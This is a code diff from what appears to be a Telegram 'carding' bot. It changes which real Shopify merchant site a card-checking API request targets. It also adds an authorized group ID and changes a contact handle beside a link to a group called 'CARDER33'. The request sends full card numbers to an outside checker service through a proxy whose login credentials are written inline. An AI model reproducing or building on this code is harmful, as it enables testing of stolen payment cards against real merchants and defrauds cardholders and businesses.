@@ -2652,7 +2652,7 @@ async def process_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, payload
         # --- API request ---
         api_url = (
             f"https://auto-shopify-6cz4.onrender.com/index.php"
-            f"?site=https://lot22oliveoil.com"
+            f"?site=https://jasonwubeauty.com"
             f"&cc={full_card}"
             f"&proxy=qhlpirsk-238:96zjmb7awmom@p.webshare.io:80"
         )
@@ -6809,7 +6809,7 @@ from db import init_db
 from force_join import force_join, check_joined_callback  # import decorator & callback
 
 # 🛡️ Security
-AUTHORIZED_CHATS = set([-1002554243871])  # Only this group
+AUTHORIZED_CHATS = set([-1002554243871, -1002832894194])  # Only these groups
 OWNER_ID = 8493360284                     # Your Telegram user ID
 
 # 🛑 Banned users
@@ -6847,7 +6847,7 @@ def restricted(func):
         if chat_type != "private" and chat_id not in AUTHORIZED_CHATS and user_id != OWNER_ID:
             await update.message.reply_text(
                 "🚫 This group is not authorized to use this bot.\n\n"
-                "📩 Contact @K4linuxx to get access.\n"
+                "📩 Contact @Kalinuxxx to get access.\n"
                 "🔗 Official group: https://t.me/CARDER33"
             )
             return
